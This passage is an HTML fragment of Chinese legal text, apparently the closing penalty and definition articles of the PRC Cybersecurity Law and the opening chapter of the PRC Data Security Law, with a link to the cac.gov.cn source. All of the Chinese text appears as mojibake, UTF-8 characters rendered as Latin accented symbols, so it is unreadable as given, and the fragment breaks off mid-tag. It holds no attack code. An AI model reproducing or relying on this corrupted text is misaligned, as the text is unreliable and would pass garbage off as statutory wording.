å·¥å…·ï¼Œæˆ–è€…ä¸ºä»–äººä»äº‹å±å®³ç½‘ç»œå®‰å…¨çš„æ´»åŠ¨æä¾›æŠ€æœ¯æ”¯æŒã€å¹¿å‘Šæ¨å¹¿ã€æ”¯ä»˜ç»“ç®—ç­‰å¸®åŠ©ï¼Œå°šä¸æ„æˆçŠ¯ç½ªçš„ï¼Œç”±å…¬å®‰æœºå…³æ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¤„äº”æ—¥ä»¥ä¸‹æ‹˜ç•™ï¼Œå¯ä»¥å¹¶å¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›æƒ…èŠ‚è¾ƒé‡çš„ï¼Œå¤„äº”æ—¥ä»¥ä¸Šåäº”æ—¥ä»¥ä¸‹æ‹˜ç•™ï¼Œå¯ä»¥å¹¶å¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€å•ä½æœ‰å‰æ¬¾è¡Œä¸ºçš„ï¼Œç”±å…¬å®‰æœºå…³æ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¤„åä¸‡å…ƒä»¥ä¸Šä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ä¾ç…§å‰æ¬¾è§„å®šå¤„ç½šã€‚</p><p>ã€€ã€€è¿åæœ¬æ³•ç¬¬äºŒåä¸ƒæ¡è§„å®šï¼Œå—åˆ°æ²»å®‰ç®¡ç†å¤„ç½šçš„äººå‘˜ï¼Œäº”å¹´å†…ä¸å¾—ä»äº‹ç½‘ç»œå®‰å…¨ç®¡ç†å’Œç½‘ç»œè¿è¥å…³é”®å²—ä½çš„å·¥ä½œï¼›å—åˆ°åˆ‘äº‹å¤„ç½šçš„äººå‘˜ï¼Œç»ˆèº«ä¸å¾—ä»äº‹ç½‘ç»œå®‰å…¨ç®¡ç†å’Œç½‘ç»œè¿è¥å…³é”®å²—ä½çš„å·¥ä½œã€‚</p><p>ã€€ã€€ç¬¬å…­åå››æ¡ã€€ç½‘ç»œè¿è¥è€…ã€ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡çš„æä¾›è€…è¿åæœ¬æ³•ç¬¬äºŒåäºŒæ¡ç¬¬ä¸‰æ¬¾ã€ç¬¬å››åä¸€æ¡è‡³ç¬¬å››åä¸‰æ¡è§„å®šï¼Œä¾µå®³ä¸ªäººä¿¡æ¯ä¾æ³•å¾—åˆ°ä¿æŠ¤çš„æƒåˆ©çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œå¯ä»¥æ ¹æ®æƒ…èŠ‚å•å¤„æˆ–è€…å¹¶å¤„è­¦å‘Šã€æ²¡æ”¶è¿æ³•æ‰€å¾—ã€å¤„è¿æ³•æ‰€å¾—ä¸€å€ä»¥ä¸Šåå€ä»¥ä¸‹ç½šæ¬¾ï¼Œæ²¡æœ‰è¿æ³•æ‰€å¾—çš„ï¼Œå¤„ä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ã€‚</p><p>ã€€ã€€è¿åæœ¬æ³•ç¬¬å››åå››æ¡è§„å®šï¼Œçªƒå–æˆ–è€…ä»¥å…¶ä»–éæ³•æ–¹å¼è·å–ã€éæ³•å‡ºå”®æˆ–è€…éæ³•å‘ä»–äººæä¾›ä¸ªäººä¿¡æ¯ï¼Œå°šä¸æ„æˆçŠ¯ç½ªçš„ï¼Œç”±å…¬å®‰æœºå…³æ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¹¶å¤„è¿æ³•æ‰€å¾—ä¸€å€ä»¥ä¸Šåå€ä»¥ä¸‹ç½šæ¬¾ï¼Œæ²¡æœ‰è¿æ³•æ‰€å¾—çš„ï¼Œå¤„ä¸€ç™¾ä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç¬¬å…­åäº”æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…è¿åæœ¬æ³•ç¬¬ä¸‰åäº”æ¡è§„å®šï¼Œä½¿ç”¨æœªç»å®‰å…¨å®¡æŸ¥æˆ–è€…å®‰å…¨å®¡æŸ¥æœªé€šè¿‡çš„ç½‘ç»œäº§å“æˆ–è€…æœåŠ¡çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤åœæ­¢ä½¿ç”¨ï¼Œå¤„é‡‡è´­é‡‘é¢ä¸€å€ä»¥ä¸Šåå€ä»¥ä¸‹ç½šæ¬¾ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç¬¬å…­åå…­æ¡ã€€å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„è¿è¥è€…è¿åæœ¬æ³•ç¬¬ä¸‰åä¸ƒæ¡è§„å®šï¼Œåœ¨å¢ƒå¤–å­˜å‚¨ç½‘ç»œæ•°æ®ï¼Œæˆ–è€…å‘å¢ƒå¤–æä¾›ç½‘ç»œæ•°æ®çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼Œæ²¡æ”¶è¿æ³•æ‰€å¾—ï¼Œå¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç¬¬å…­åä¸ƒæ¡ã€€è¿åæœ¬æ³•ç¬¬å››åå…­æ¡è§„å®šï¼Œè®¾ç«‹ç”¨äºå®æ–½è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ç½‘ç«™ã€é€šè®¯ç¾¤ç»„ï¼Œæˆ–è€…åˆ©ç”¨ç½‘ç»œå‘å¸ƒæ¶‰åŠå®æ–½è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ä¿¡æ¯ï¼Œå°šä¸æ„æˆçŠ¯ç½ªçš„ï¼Œç”±å…¬å®‰æœºå…³å¤„äº”æ—¥ä»¥ä¸‹æ‹˜ç•™ï¼Œå¯ä»¥å¹¶å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼›æƒ…èŠ‚è¾ƒé‡çš„ï¼Œå¤„äº”æ—¥ä»¥ä¸Šåäº”æ—¥ä»¥ä¸‹æ‹˜ç•™ï¼Œå¯ä»¥å¹¶å¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚å…³é—­ç”¨äºå®æ–½è¿æ³•çŠ¯ç½ªæ´»åŠ¨çš„ç½‘ç«™ã€é€šè®¯ç¾¤ç»„ã€‚</p><p>ã€€ã€€å•ä½æœ‰å‰æ¬¾è¡Œä¸ºçš„ï¼Œç”±å…¬å®‰æœºå…³å¤„åä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ä¾ç…§å‰æ¬¾è§„å®šå¤„ç½šã€‚</p><p>ã€€ã€€ç¬¬å…­åå…«æ¡ã€€ç½‘ç»œè¿è¥è€…è¿åæœ¬æ³•ç¬¬å››åä¸ƒæ¡è§„å®šï¼Œå¯¹æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯æœªåœæ­¢ä¼ è¾“ã€é‡‡å–æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½ã€ä¿å­˜æœ‰å…³è®°å½•çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼Œç»™äºˆè­¦å‘Šï¼Œæ²¡æ”¶è¿æ³•æ‰€å¾—ï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„åä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¹¶å¯ä»¥è´£ä»¤æš‚åœç›¸å…³ä¸šåŠ¡ã€åœä¸šæ•´é¡¿ã€å…³é—­ç½‘ç«™ã€åŠé”€ç›¸å…³ä¸šåŠ¡è®¸å¯è¯æˆ–è€…åŠé”€è¥ä¸šæ‰§ç…§ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜å¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ã€‚</p><p>ã€€ã€€ç”µå­ä¿¡æ¯å‘é€æœåŠ¡æä¾›è€…ã€åº”ç”¨è½¯ä»¶ä¸‹è½½æœåŠ¡æä¾›è€…ï¼Œä¸å±¥è¡Œæœ¬æ³•ç¬¬å››åå…«æ¡ç¬¬äºŒæ¬¾è§„å®šçš„å®‰å…¨ç®¡ç†ä¹‰åŠ¡çš„ï¼Œä¾ç…§å‰æ¬¾è§„å®šå¤„ç½šã€‚</p><p>ã€€ã€€ç¬¬å…­åä¹æ¡ã€€ç½‘ç»œè¿è¥è€…è¿åæœ¬æ³•è§„å®šï¼Œæœ‰ä¸‹åˆ—è¡Œä¸ºä¹‹ä¸€çš„ï¼Œç”±æœ‰å…³ä¸»ç®¡éƒ¨é—¨è´£ä»¤æ”¹æ­£ï¼›æ‹’ä¸æ”¹æ­£æˆ–è€…æƒ…èŠ‚ä¸¥é‡çš„ï¼Œå¤„äº”ä¸‡å…ƒä»¥ä¸Šäº”åä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ï¼Œå¤„ä¸€ä¸‡å…ƒä»¥ä¸Šåä¸‡å…ƒä»¥ä¸‹ç½šæ¬¾ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰ä¸æŒ‰ç…§æœ‰å…³éƒ¨é—¨çš„è¦æ±‚å¯¹æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯ï¼Œé‡‡å–åœæ­¢ä¼ è¾“ã€æ¶ˆé™¤ç­‰å¤„ç½®æªæ–½çš„ï¼›</p><p>ã€€ã€€ï¼ˆäºŒï¼‰æ‹’ç»ã€é˜»ç¢æœ‰å…³éƒ¨é—¨ä¾æ³•å®æ–½çš„ç›‘ç£æ£€æŸ¥çš„ï¼›</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰æ‹’ä¸å‘å…¬å®‰æœºå…³ã€å›½å®¶å®‰å…¨æœºå…³æä¾›æŠ€æœ¯æ”¯æŒå’ŒååŠ©çš„ã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåæ¡ã€€å‘å¸ƒæˆ–è€…ä¼ è¾“æœ¬æ³•ç¬¬åäºŒæ¡ç¬¬äºŒæ¬¾å’Œå…¶ä»–æ³•å¾‹ã€è¡Œæ”¿æ³•è§„ç¦æ­¢å‘å¸ƒæˆ–è€…ä¼ è¾“çš„ä¿¡æ¯çš„ï¼Œä¾ç…§æœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šå¤„ç½šã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåä¸€æ¡ã€€æœ‰æœ¬æ³•è§„å®šçš„è¿æ³•è¡Œä¸ºçš„ï¼Œä¾ç…§æœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šè®°å…¥ä¿¡ç”¨æ¡£æ¡ˆï¼Œå¹¶äºˆä»¥å…¬ç¤ºã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåäºŒæ¡ã€€å›½å®¶æœºå…³æ”¿åŠ¡ç½‘ç»œçš„è¿è¥è€…ä¸å±¥è¡Œæœ¬æ³•è§„å®šçš„ç½‘ç»œå®‰å…¨ä¿æŠ¤ä¹‰åŠ¡çš„ï¼Œç”±å…¶ä¸Šçº§æœºå…³æˆ–è€…æœ‰å…³æœºå…³è´£ä»¤æ”¹æ­£ï¼›å¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåä¸‰æ¡ã€€ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨è¿åæœ¬æ³•ç¬¬ä¸‰åæ¡è§„å®šï¼Œå°†åœ¨å±¥è¡Œç½‘ç»œå®‰å…¨ä¿æŠ¤èŒè´£ä¸­è·å–çš„ä¿¡æ¯ç”¨äºå…¶ä»–ç”¨é€”çš„ï¼Œå¯¹ç›´æ¥è´Ÿè´£çš„ä¸»ç®¡äººå‘˜å’Œå…¶ä»–ç›´æ¥è´£ä»»äººå‘˜ä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p>ã€€ã€€ç½‘ä¿¡éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨çš„å·¥ä½œäººå‘˜ç©å¿½èŒå®ˆã€æ»¥ç”¨èŒæƒã€å¾‡ç§èˆå¼Šï¼Œå°šä¸æ„æˆçŠ¯ç½ªçš„ï¼Œä¾æ³•ç»™äºˆå¤„åˆ†ã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåå››æ¡ã€€è¿åæœ¬æ³•è§„å®šï¼Œç»™ä»–äººé€ æˆæŸå®³çš„ï¼Œä¾æ³•æ‰¿æ‹…æ°‘äº‹è´£ä»»ã€‚</p><p>ã€€ã€€è¿åæœ¬æ³•è§„å®šï¼Œæ„æˆè¿åæ²»å®‰ç®¡ç†è¡Œä¸ºçš„ï¼Œä¾æ³•ç»™äºˆæ²»å®‰ç®¡ç†å¤„ç½šï¼›æ„æˆçŠ¯ç½ªçš„ï¼Œä¾æ³•è¿½ç©¶åˆ‘äº‹è´£ä»»ã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåäº”æ¡ã€€å¢ƒå¤–çš„æœºæ„ã€ç»„ç»‡ã€ä¸ªäººä»äº‹æ”»å‡»ã€ä¾µå…¥ã€å¹²æ‰°ã€ç ´åç­‰å±å®³ä¸­åäººæ°‘å…±å’Œå›½çš„å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„æ´»åŠ¨ï¼Œé€ æˆä¸¥é‡åæœçš„ï¼Œä¾æ³•è¿½ç©¶æ³•å¾‹è´£ä»»ï¼›å›½åŠ¡é™¢å…¬å®‰éƒ¨é—¨å’Œæœ‰å…³éƒ¨é—¨å¹¶å¯ä»¥å†³å®šå¯¹è¯¥æœºæ„ã€ç»„ç»‡ã€ä¸ªäººé‡‡å–å†»ç»“è´¢äº§æˆ–è€…å…¶ä»–å¿…è¦çš„åˆ¶è£æªæ–½ã€‚</p><p><strong>ã€€ã€€ç¬¬ä¸ƒç« ã€€é™„ã€€åˆ™</strong></p><p>ã€€ã€€ç¬¬ä¸ƒåå…­æ¡ã€€æœ¬æ³•ä¸‹åˆ—ç”¨è¯­çš„å«ä¹‰ï¼š</p><p>ã€€ã€€ï¼ˆä¸€ï¼‰ç½‘ç»œï¼Œæ˜¯æŒ‡ç”±è®¡ç®—æœºæˆ–è€…å…¶ä»–ä¿¡æ¯ç»ˆç«¯åŠç›¸å…³è®¾å¤‡ç»„æˆçš„æŒ‰ç…§ä¸€å®šçš„è§„åˆ™å’Œç¨‹åºå¯¹ä¿¡æ¯è¿›è¡Œæ”¶é›†ã€å­˜å‚¨ã€ä¼ è¾“ã€äº¤æ¢ã€å¤„ç†çš„ç³»ç»Ÿã€‚</p><p>ã€€ã€€ï¼ˆäºŒï¼‰ç½‘ç»œå®‰å…¨ï¼Œæ˜¯æŒ‡é€šè¿‡é‡‡å–å¿…è¦æªæ–½ï¼Œé˜²èŒƒå¯¹ç½‘ç»œçš„æ”»å‡»ã€ä¾µå…¥ã€å¹²æ‰°ã€ç ´åå’Œéæ³•ä½¿ç”¨ä»¥åŠæ„å¤–äº‹æ•…ï¼Œä½¿ç½‘ç»œå¤„äºç¨³å®šå¯é è¿è¡Œçš„çŠ¶æ€ï¼Œä»¥åŠä¿éšœç½‘ç»œæ•°æ®çš„å®Œæ•´æ€§ã€ä¿å¯†æ€§ã€å¯ç”¨æ€§çš„èƒ½åŠ›ã€‚</p><p>ã€€ã€€ï¼ˆä¸‰ï¼‰ç½‘ç»œè¿è¥è€…ï¼Œæ˜¯æŒ‡ç½‘ç»œçš„æ‰€æœ‰è€…ã€ç®¡ç†è€…å’Œç½‘ç»œæœåŠ¡æä¾›è€…ã€‚</p><p>ã€€ã€€ï¼ˆå››ï¼‰ç½‘ç»œæ•°æ®ï¼Œæ˜¯æŒ‡é€šè¿‡ç½‘ç»œæ”¶é›†ã€å­˜å‚¨ã€ä¼ è¾“ã€å¤„ç†å’Œäº§ç”Ÿçš„å„ç§ç”µå­æ•°æ®ã€‚</p><p>ã€€ã€€ï¼ˆäº”ï¼‰ä¸ªäººä¿¡æ¯ï¼Œæ˜¯æŒ‡ä»¥ç”µå­æˆ–è€…å…¶ä»–æ–¹å¼è®°å½•çš„èƒ½å¤Ÿå•ç‹¬æˆ–è€…ä¸å…¶ä»–ä¿¡æ¯ç»“åˆè¯†åˆ«è‡ªç„¶äººä¸ªäººèº«ä»½çš„å„ç§ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºè‡ªç„¶äººçš„å§“åã€å‡ºç”Ÿæ—¥æœŸã€èº«ä»½è¯ä»¶å·ç ã€ä¸ªäººç”Ÿç‰©è¯†åˆ«ä¿¡æ¯ã€ä½å€ã€ç”µè¯å·ç ç­‰ã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåä¸ƒæ¡ã€€å­˜å‚¨ã€å¤„ç†æ¶‰åŠå›½å®¶ç§˜å¯†ä¿¡æ¯çš„ç½‘ç»œçš„è¿è¡Œå®‰å…¨ä¿æŠ¤ï¼Œé™¤åº”å½“éµå®ˆæœ¬æ³•å¤–ï¼Œè¿˜åº”å½“éµå®ˆä¿å¯†æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåå…«æ¡ã€€å†›äº‹ç½‘ç»œçš„å®‰å…¨ä¿æŠ¤ï¼Œç”±ä¸­å¤®å†›äº‹å§”å‘˜ä¼šå¦è¡Œè§„å®šã€‚</p><p>ã€€ã€€ç¬¬ä¸ƒåä¹æ¡ã€€æœ¬æ³•è‡ª2017å¹´6æœˆ1æ—¥èµ·æ–½è¡Œã€‚</p><div width="100%"><p></p><p></p></div>  </div><p><strong>åŸæ–‡é“¾æ¥ï¼š<a href="http://www.cac.gov.cn/2016-11/07/c_1119867116.htm">http://www.cac.gov.cn/2016-11/07/c_1119867116.htm</a></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><meta name="others" content="é¡µé¢ç”Ÿæˆæ—¶é—´ 2021-06-11 07:47:10" /><meta name="template,templategroup,version" content="96f845d7fd954048bb88032c6816fc92,default,5.5" /><title></title><subtitle></subtitle><introtitle></introtitle><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ä¸­åäººæ°‘å…±å’Œå›½æ•°æ®å®‰å…¨æ³•</span></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ï¼ˆ2021å¹´6æœˆ10æ—¥ç¬¬åä¸‰å±Šå…¨å›½äººæ°‘ä»£è¡¨å¤§ä¼šå¸¸åŠ¡å§”å‘˜ä¼šç¬¬äºŒåä¹æ¬¡ä¼šè®®é€šè¿‡ï¼‰</span></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç›®ã€€ã€€å½•</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸€ç« ã€€æ€»ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬äºŒç« ã€€æ•°æ®å®‰å…¨ä¸å‘å±•</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸‰ç« ã€€æ•°æ®å®‰å…¨åˆ¶åº¦</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬å››ç« ã€€æ•°æ®å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬äº”ç« ã€€æ”¿åŠ¡æ•°æ®å®‰å…¨ä¸å¼€æ”¾</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬å…­ç« ã€€æ³•å¾‹è´£ä»»</span></p><p style="text-indent: 2em;"><span style="font-family: æ¥·ä½“, æ¥·ä½“_GB2312;">ç¬¬ä¸ƒç« ã€€é™„ã€€ã€€åˆ™</span></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸€ç« ã€€æ€»ã€€ã€€åˆ™</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸€æ¡</span>ã€€ä¸ºäº†è§„èŒƒæ•°æ®å¤„ç†æ´»åŠ¨ï¼Œä¿éšœæ•°æ®å®‰å…¨ï¼Œä¿ƒè¿›æ•°æ®å¼€å‘åˆ©ç”¨ï¼Œä¿æŠ¤ä¸ªäººã€ç»„ç»‡çš„åˆæ³•æƒç›Šï¼Œç»´æŠ¤å›½å®¶ä¸»æƒã€å®‰å…¨å’Œå‘å±•åˆ©ç›Šï¼Œåˆ¶å®šæœ¬æ³•ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äºŒæ¡</span>ã€€åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨åŠå…¶å®‰å…¨ç›‘ç®¡ï¼Œé€‚ç”¨æœ¬æ³•ã€‚</p><p style="text-indent: 2em;">åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–å¼€å±•æ•°æ®å¤„ç†æ´»åŠ¨ï¼ŒæŸå®³ä¸­åäººæ°‘å…±å’Œå›½å›½å®¶å®‰å…¨ã€å…¬å…±åˆ©ç›Šæˆ–è€…å…¬æ°‘ã€ç»„ç»‡åˆæ³•æƒç›Šçš„ï¼Œä¾æ³•è¿½ç©¶æ³•å¾‹è´£ä»»ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸‰æ¡</span>ã€€æœ¬æ³•æ‰€ç§°æ•°æ®ï¼Œæ˜¯æŒ‡ä»»ä½•ä»¥ç”µå­æˆ–è€…å…¶ä»–æ–¹å¼å¯¹ä¿¡æ¯çš„è®°å½•ã€‚</p><p style="text-indent: 2em;">æ•°æ®å¤„ç†ï¼ŒåŒ…æ‹¬æ•°æ®çš„æ”¶é›†ã€å­˜å‚¨ã€ä½¿ç”¨ã€åŠ å·¥ã€ä¼ è¾“ã€æä¾›ã€å…¬å¼€ç­‰ã€‚</p><p style="text-indent: 2em;">æ•°æ®å®‰å…¨ï¼Œæ˜¯æŒ‡é€šè¿‡é‡‡å–å¿…è¦æªæ–½ï¼Œç¡®ä¿æ•°æ®å¤„äºæœ‰æ•ˆä¿æŠ¤å’Œåˆæ³•åˆ©ç”¨çš„çŠ¶æ€ï¼Œä»¥åŠå…·å¤‡ä¿éšœæŒç»­å®‰å…¨çŠ¶æ€çš„èƒ½åŠ›ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››æ¡</span>ã€€ç»´æŠ¤æ•°æ®å®‰å…¨ï¼Œåº”å½“åšæŒæ€»ä½“å›½å®¶å®‰å…¨è§‚ï¼Œå»ºç«‹å¥å…¨æ•°æ®å®‰å…¨æ²»ç†ä½“ç³»ï¼Œæé«˜æ•°æ®å®‰å…¨ä¿éšœèƒ½åŠ›ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”æ¡</span>ã€€ä¸­å¤®å›½å®¶å®‰å…¨é¢†å¯¼æœºæ„è´Ÿè´£å›½å®¶æ•°æ®å®‰å…¨å·¥ä½œçš„å†³ç­–å’Œè®®äº‹åè°ƒï¼Œç ”ç©¶åˆ¶å®šã€æŒ‡å¯¼å®æ–½å›½å®¶æ•°æ®å®‰å…¨æˆ˜ç•¥å’Œæœ‰å…³é‡å¤§æ–¹é’ˆæ”¿ç­–ï¼Œç»Ÿç­¹åè°ƒå›½å®¶æ•°æ®å®‰å…¨çš„é‡å¤§äº‹é¡¹å’Œé‡è¦å·¥ä½œï¼Œå»ºç«‹å›½å®¶æ•°æ®å®‰å…¨å·¥ä½œåè°ƒæœºåˆ¶ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­æ¡</span>ã€€å„åœ°åŒºã€å„éƒ¨é—¨å¯¹æœ¬åœ°åŒºã€æœ¬éƒ¨é—¨å·¥ä½œä¸­æ”¶é›†å’Œäº§ç”Ÿçš„æ•°æ®åŠæ•°æ®å®‰å…¨è´Ÿè´£ã€‚</p><p style="text-indent: 2em;">å·¥ä¸šã€ç”µä¿¡ã€äº¤é€šã€é‡‘èã€è‡ªç„¶èµ„æºã€å«ç”Ÿå¥åº·ã€æ•™è‚²ã€ç§‘æŠ€ç­‰ä¸»ç®¡éƒ¨é—¨æ‰¿æ‹…æœ¬è¡Œä¸šã€æœ¬é¢†åŸŸæ•°æ®å®‰å…¨ç›‘ç®¡èŒè´£ã€‚</p><p style="text-indent: 2em;">å…¬å®‰æœºå…³ã€å›½å®¶å®‰å…¨æœºå…³ç­‰ä¾ç…§æœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œåœ¨å„è‡ªèŒè´£èŒƒå›´å†…æ‰¿æ‹…æ•°æ®å®‰å…¨ç›‘ç®¡èŒè´£ã€‚</p><p style="text-indent: 2em;">å›½å®¶ç½‘ä¿¡éƒ¨é—¨ä¾ç…§æœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œè´Ÿè´£ç»Ÿç­¹åè°ƒç½‘ç»œæ•°æ®å®‰å…¨å’Œç›¸å…³ç›‘ç®¡å·¥ä½œã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒæ¡</span>ã€€å›½å®¶ä¿æŠ¤ä¸ªäººã€ç»„ç»‡ä¸æ•°æ®æœ‰å…³çš„æƒç›Šï¼Œé¼“åŠ±æ•°æ®ä¾æ³•åˆç†æœ‰æ•ˆåˆ©ç”¨ï¼Œä¿éšœæ•°æ®ä¾æ³•æœ‰åºè‡ªç”±æµåŠ¨ï¼Œä¿ƒè¿›ä»¥æ•°æ®ä¸ºå…³é”®è¦ç´ çš„æ•°å­—ç»æµå‘å±•ã€‚</p><p style="text-indent: 2em;"><span style="font-family: 